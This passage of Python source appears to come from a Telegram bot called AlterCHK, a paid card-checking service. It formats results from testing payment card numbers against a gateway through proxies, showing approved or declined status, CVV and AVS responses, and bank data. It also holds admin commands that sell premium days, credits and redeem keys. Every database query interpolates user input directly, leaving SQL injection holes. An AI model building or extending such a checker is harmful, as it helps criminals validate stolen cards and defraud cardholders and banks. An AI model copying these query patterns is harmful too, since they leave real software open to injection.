        if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
        else : UserName = f'@{message.from_user.username}'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        if (Status[0] == 'Approved') :
            AVSDATA = Status[2]
            PROCCVV2 = Status[3]
            RESPMSG = Status[1]
            respstatus = '[ APPROVED ✅ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nCVV ↯ <b>[{PROCCVV2}]</b> | AVS ↯ <b>[{AVSDATA}]</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        elif (Status[0] == 'Declined') :
            AVSDATA = Status[2]
            PROCCVV2 = Status[3]
            RESPMSG = Status[1]
            respstatus = '[ DECLINED ❌ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nCVV ↯ <b>[{PROCCVV2}]</b> | AVS ↯ <b>[{AVSDATA}]</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        if (Status[0] == 'ApprovedSinCVV') :
            RESPMSG = Status[1]
            respstatus = '[ APPROVED ✅ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        elif (Status[0] == 'DeclinedSinCVV') :
            RESPMSG = Status[1]
            respstatus = '[ DECLINED ❌ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        elif int(Status.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {Status} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["premium"])
async def CMDpremium(message: types.Message):
    AccessSTAFF = await AccessAdmin(message.from_user.id)
    if not AccessSTAFF: return
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    yourmessageone = message.text[9:]
    async def CaptureData() :
        try :
            Separador = yourmessageone.split("|")
            UserIDUP = Separador[0]
            DaysAdded = Separador[1]
            if UserIDUP.find('-') >= 0 :
                try :
                    result = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{UserIDUP}'")
                    if len(result) != 0 :
                        if len(UserIDUP) >= 7 :
                            if DaysAdded != '' :
                                if int(DaysAdded) < 1 : return None
                                return "UPDATE", UserIDUP, DaysAdded, 'ChatID'
                    elif len(result) == 0 :
                        if len(UserIDUP) >= 7 :
                            if DaysAdded != '' :
                                if int(DaysAdded) < 1 : return None                                    
                                return "INSERT", UserIDUP, DaysAdded, 'ChatID'
                except IndexError : None
            else :
                try :
                    result = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{UserIDUP}'")
                    if len(result) != 0 :
                        if len(UserIDUP) >= 7 :
                            if DaysAdded != '' : return "UPDATE", UserIDUP, DaysAdded, 'UserID'
                    elif len(result) == 0 :
                        if len(UserIDUP) >= 7 :
                            if DaysAdded != '' :
                                try :
                                    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{UserIDUP}'")
                                    result = json.loads(json.dumps(result[0]))
                                except IndexError: return 'User no exist'
                                return "INSERT", UserIDUP, DaysAdded, 'UserID'
                except IndexError : None
        except IndexError : None
    CaptureData = await CaptureData()
    if not CaptureData:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    elif CaptureData == 'User no exist' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe user is not found in my DB! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else :
        if CaptureData[3] == 'ChatID' :
            from datetime import datetime, timedelta, date
            import pytz

            FormatBilling = date.today() + timedelta(days=int(CaptureData[2]))
            fechasinformato = datetime.now(pytz.timezone('US/Central') )
            NextBilling = fechasinformato + timedelta(days=int(CaptureData[2]))
            NextBilling = NextBilling.strftime("%d-%m-%Y %H:%M:%S")
            
            if CaptureData[0] == 'INSERT':
                try :
                    await ConnectDB.run_query(f"INSERT INTO userpremium (ID, FormatBilling, NextBilling) VALUES ('{CaptureData[1]}','{FormatBilling}','{NextBilling}')")
                    await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ CHAT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ ChatID ↯ [ <code>{CaptureData[1]}</code> ]\n↯ Days added ↯ <code>{CaptureData[2]} day(s)</code>\n↯ NextBilling ↯ <code>{NextBilling}</code>\n- - - - - - - - - - - - - - - - - - - - -\nCheck your chat now!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                    await bot.send_message(chat_id=-1001857380843, text=f"<b>New Added Premium: <code>{CaptureData[1]}</code>\nDays Added: <code>{CaptureData[2]} day(s)</code>\nAdmin: @{message.from_user.username}</b>")
                    return
                except TimeoutError or exceptions.RetryAfter as e:
                    await asyncio.sleep(e.value)
                    return
            elif CaptureData[0] == 'UPDATE' :
                try :
                    await ConnectDB.run_query(f"UPDATE userpremium SET FormatBilling='{FormatBilling}', NextBilling='{NextBilling}' WHERE ID='{CaptureData[1]}'")
                    await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ CHAT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ ChatID ↯ [ <code>{CaptureData[1]}</code> ]\n↯ Days added ↯ <code>{CaptureData[2]} day(s)</code>\n↯ NextBilling ↯ <code>{NextBilling}</code>\n- - - - - - - - - - - - - - - - - - - - -\nCheck your chat now!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                    await bot.send_message(chat_id=-1001857380843, text=f"<b>New Added Premium: <code>{CaptureData[1]}</code>\nDays Added: <code>{CaptureData[2]} day(s)</code>\nAdmin: @{message.from_user.username}</b>")
                    return
                except TimeoutError or exceptions.RetryAfter as e:
                    await asyncio.sleep(e.value)
                    return
        elif CaptureData[3] == 'UserID' :
            from datetime import datetime, timedelta, date
            import pytz

            FormatBilling = date.today() + timedelta(days=int(CaptureData[2]))

            fechasinformato = datetime.now(pytz.timezone('US/Central'))
            NextBilling = fechasinformato + timedelta(days=int(CaptureData[2]))
            NextBilling = NextBilling.strftime("%d-%m-%Y %H:%M:%S")

            if CaptureData[0] == 'INSERT':
                await ConnectDB.run_query(f"INSERT INTO userpremium (ID, FormatBilling, NextBilling) VALUES ('{CaptureData[1]}','{FormatBilling}','{NextBilling}')")
                await ConnectDB.run_query(f"UPDATE pruebas SET Status='Premium' , TimeAntiSpam='35' WHERE ID='{CaptureData[1]}'")

                result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{CaptureData[1]}'")
                result = json.loads(json.dumps(result[0]))
                UserStatus   =  result['Status']
                Credits      =  result['Creditos']
                TimeAntiSpam =  result['TimeAntiSpam']
                Warnings     =  result['Warnings']
                UserBanned   =  result['UserBanned']

                try :
                    await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ ACCOUNT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ UserID ↯ [ <code>{CaptureData[1]}</code> ]\n↯ Status ↯ <code>{UserStatus}</code> | Days added: <code>{CaptureData[2]} day(s)</code>\n↯ Credits ↯ <code>{Credits}</code>\n↯ AntiSpam ↯ <code>{TimeAntiSpam}s</code>\n↯ Warnings ↯ <code>{Warnings}</code> | Banned: <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -\nCheck the private chat with me\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                    await bot.send_message(chat_id=-1001857380843, text=f"<b>New Added Premium: <code>{CaptureData[1]}</code>\nDays Added: <code>{CaptureData[2]} day(s)</code>\nAdmin: @{message.from_user.username}</b>")
                except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)

                import datetime
                ahora = datetime.datetime.now(pytz.timezone('UTC'))
                expireminutes = ahora + datetime.timedelta(minutes=120)
                try :
                    link = await bot.create_chat_invite_link(chat_id=-1001857380843, member_limit=1, expire_date=expireminutes)
                    one = InlineKeyboardButton('𝘼𝙡𝙩𝙚𝙧𝘾𝙃𝙆 𝙈𝙚𝙢𝙗𝙚𝙧𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢', url=link.invite_link)

                    try :
                        language = message.from_user.language_code
                        lenguage_code = language[0:2].lower()
                    except TypeError:
                        translate = 'Please, join the Alter user group. ⬇'
                    else :
                        translate = await Translate(lenguage_code,'Please, join the Alter user group. ⬇')

                    remaining_days = (datetime.datetime.strptime(str(FormatBilling),'%Y-%m-%d') - datetime.datetime.today()).days
                    if (int(remaining_days) == 0) or (int(remaining_days) == -1): remaining_days = 'Today'
                    elif (int(remaining_days) == 1) : remaining_days = '1 day'
                    else : remaining_days = f'{int(remaining_days) + 1} days'

                    repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
                    await bot.send_message(chat_id=CaptureData[1], text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ ACCOUNT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ UserID ↯ [ <code>{CaptureData[1]}</code> ]\n↯ Status ↯ <code>{UserStatus}</code>\n↯ NextBilling ↯ <code>{NextBilling}</code> | ↯ Expired in ↯ <code>{remaining_days}</code>\n↯ Credits ↯ <code>{Credits}</code>\n↯ AntiSpam ↯ <code>{TimeAntiSpam}s</code>\n↯ Warnings ↯ <code>{Warnings}</code> | Banned: <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -\n{translate}\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_markup=repmarkup)

                except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
                except ErrorsAiogram.utils.exceptions.ChatNotFound: print("ERROR AL ENVIAR EL LINK")

            elif CaptureData[0] == 'UPDATE' :
                await ConnectDB.run_query(f"UPDATE userpremium SET FormatBilling='{FormatBilling}', NextBilling='{NextBilling}' WHERE ID='{CaptureData[1]}'")
                await ConnectDB.run_query(f"UPDATE pruebas SET Status='Premium' , TimeAntiSpam='35' WHERE ID='{CaptureData[1]}'")

                result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{CaptureData[1]}'")
                result = json.loads(json.dumps(result[0]))
                UserStatus   =  result['Status']
                Credits      =  result['Creditos']
                TimeAntiSpam =  result['TimeAntiSpam']
                Warnings     =  result['Warnings']
                UserBanned   =  result['UserBanned']
                try :
                    await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ ACCOUNT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ </b>UserID<b> ↯ [ <code>{CaptureData[1]}</code> ]\n↯ </b>Status<b> ↯ <code>{UserStatus}</code> | </b>Days added:<b> <code>{CaptureData[2]} day(s)</code>\n↯ </b>Credits<b> ↯ <code>{Credits}</code>\n↯ </b>AntiSpam<b> ↯ <code>{TimeAntiSpam}s</code>\n↯ </b>Warnings<b> ↯ <code>{Warnings}</code> | </b>UserBanned:<b> <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -\nCheck the private chat with me\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                    await bot.send_message(chat_id=-1001857380843, text=f"<b>New Added Premium: <code>{CaptureData[1]}</code>\nDays Added: <code>{CaptureData[2]} day(s)</code>\nAdmin: @{message.from_user.username}</b>")
                except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)          
                
                import datetime
                ahora = datetime.datetime.now(pytz.timezone('UTC'))
                expireminutes = ahora + datetime.timedelta(minutes=120)
                try :
                    one = InlineKeyboardButton('𝘼𝙡𝙩𝙚𝙧𝘾𝙃𝙆 𝙇𝙞𝙣𝙠𝙨', url="https://t.me/alterchk/40")
                    try :
                        language = message.from_user.language_code
                        lenguage_code = language[0:2].lower()
                    except TypeError:
                        translate = 'If you have not yet joined the Alter user group, please request one from an administrator. ⬇'
                    else :
                        translate = await Translate(lenguage_code,'If you have not yet joined the Alter user group, please request one from an administrator. ⬇')

                    remaining_days = (datetime.datetime.strptime(str(FormatBilling),'%Y-%m-%d') - datetime.datetime.today()).days
                    if (int(remaining_days) == 0) or (int(remaining_days) == -1): remaining_days = 'Today'
                    elif (int(remaining_days) == 1) : remaining_days = '1 day'
                    else : remaining_days = f'{int(remaining_days) + 1} days'

                    repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
                    await bot.send_message(chat_id=CaptureData[1], text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ ACCOUNT UPDATED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\n↯ UserID ↯ [ <code>{CaptureData[1]}</code> ]\n↯ Status ↯ <code>{UserStatus}</code>\n↯ NextBilling ↯ <code>{NextBilling}</code> | ↯ Expired in ↯ <code>{remaining_days}</code>\n↯ Credits ↯ <code>{Credits}</code>\n↯ AntiSpam ↯ <code>{TimeAntiSpam}s</code>\n↯ Warnings ↯ <code>{Warnings}</code> | Banned: <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -\n{translate}\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_markup=repmarkup)

                except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
                except ErrorsAiogram.utils.exceptions.ChatNotFound: print("ERROR AL ENVIAR EL LINK")
         

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["key"])
async def CMDkey(message: types.Message):
    AccessSTAFF = await AccessOwner(message.from_user.id)
    if not AccessSTAFF: return
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)

    async def CreateKey() :
        import string_utils
        permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        redeem = f'AlterCHK-{string_utils.shuffle(permitted_chars)[0:25]}-Bot'
        yourmessage = message.text[5:]
        try :
            Separador = yourmessage.split("|")
            Days = Separador[0]
            Credits = Separador[1]
            UserPermitteds = Separador[2]
            if not Days.isnumeric(): return None
            elif not Credits.isnumeric(): return None
            elif not UserPermitteds.isnumeric(): return None
            if int(UserPermitteds) <= 0 : return None
            if int(Days) <= 0 : return None
        except IndexError : return None
        return redeem, Days, Credits, UserPermitteds

    if re.sub("[^0-9]", "", message.text) == '':
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    KeyDates = await CreateKey()
    if not KeyDates:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else :
        try :
            if int(KeyDates[1]) == 1 : Days = '1 day'
            else : Days = f'{KeyDates[1]} days'
            await ConnectDB.run_query(f"INSERT INTO keysalter (KeyAlter, Days, Credits, UsersAlloweds) VALUES ('{KeyDates[0]}','{KeyDates[1]}','{KeyDates[2]}', '{KeyDates[3]}')")
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nKEY SUCCESSF. CREATED\n- - - - - - - - - - - - - - - - - - - - -\n↯ 🔥 Key Created 🔥 ↯\n( <code>{KeyDates[0]}</code> )\n↯ ⌚️ Information ⌚️ ↯\n(<code>{Days}</code> <code>{KeyDates[2]} credits</code>)\n- - - - - - - - - - - - - - - - - - - - -\n↯ 🏮 Access Gateways 🏮 ↯\n<code>- Normal ↯ Gateways\n- Private ↯ Gateways</code>\n - - - - - - - - - - - - - - - - - - - -\nCan redeem it ↯ {KeyDates[3]} user(s)\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)

        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["timeup"])
async def CMDMyacc(message: types.Message):
    AccessSTAFF = await AccessAdmin(message.from_user.id)
    if not AccessSTAFF: return
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    yourmessageone = message.text[8:]
    async def CaptureData() :
        try :
            Separador = yourmessageone.split("|")
            UserIDUP = Separador[0]
            TimeUp = Separador[1]
            try :
                result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{UserIDUP}'")
                if len(result) != 0 : return UserIDUP, TimeUp
                else : return None   
            except IndexError : None
        except IndexError : None

    CaptureData = await CaptureData()
    if not CaptureData:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else :
        try :
            await ConnectDB.run_query(f"UPDATE pruebas SET TimeAntiSpam='{CaptureData[1]}' WHERE ID='{CaptureData[0]}'")
            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ COMPLETE UPDATE ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\nUserID: <code>{CaptureData[0]}</code>\nNewAntiSpam: <code>{CaptureData[1]} second(s)</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id, reply_markup=repmarkup)
            await bot.send_message(chat_id=-1001857380843, text=f"<b>New AntiSpam: <code>{CaptureData[1]}s</code>\nUserID: <code>{CaptureData[0]}</code>\nAdmin: @{message.from_user.username}</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return

 
@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["addcr"])
async def CMDMyacc(message: types.Message):
    AccessSTAFF = await AccessOwner(message.from_user.id)
    if not AccessSTAFF: return
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    yourmessageone = message.text[7:]
    async def CaptureData() :
        try :
            Separador = yourmessageone.split("|")
            UserIDUP = Separador[0]
            Credits = Separador[1]
            if Credits.isdigit(): pass
            else: return None
            try :
                result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{UserIDUP}'")
                result = json.loads(json.dumps(result[0]))
                UserStatus   =  result['Status']
                if len(result) != 0 : return UserIDUP, Credits, UserStatus
                else : return None   
            except IndexError : None
        except IndexError : None

    CaptureData = await CaptureData()
    if not CaptureData:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else :
        try :
            await ConnectDB.run_query(f"UPDATE pruebas SET Creditos='{CaptureData[1]}' WHERE ID='{CaptureData[0]}'")

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ COMPLETE UPDATE ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\nUserID: <code>{CaptureData[0]}</code>\nStatus: <code>{CaptureData[2]}</code>\nCredits: <code>{CaptureData[1]}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id, reply_markup=repmarkup)
            await bot.send_message(chat_id=-1001857380843, text=f"<b>New Credits: <code>{CaptureData[1]}</code>\nUserID: <code>{CaptureData[0]}</code>\nAdmin: @{message.from_user.username}</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        
@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["alban"])
async def CMDalban(message: types.Message):
    AccessSTAFF = await AccessAdmin(message.from_user.id)
    if not AccessSTAFF: return
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    async def CaptureData() :
        try :
            Separador = message.text
            UserIDUP = re.sub("[^0-9]", "", Separador)
            try :
                result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{UserIDUP}'")
                if len(result) != 0 : return UserIDUP
                else : return None   
            except IndexError : None
        except IndexError : None

    CaptureData = await CaptureData()
    if not CaptureData:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncomplete ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else :
        try :
            await ConnectDB.run_query(f"UPDATE pruebas SET UserBanned='Yes' WHERE ID='{CaptureData}'")
            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n🔥 ↯ COMPLETE BANNED ↯ 🔥\n- - - - - - - - - - - - - - - - - - - - -\nUserID: <code>{CaptureData}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id, reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["alunban"])
async def CMDalunban(message: types.Message):
    AccessSTAFF = await AccessAdmin(message.from_user.id)
    if not AccessSTAFF: return
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    async def CaptureData() :
        try :
            Separador = message.text
            UserIDUP = re.sub("[^0-9]", "", Separador)
            try :
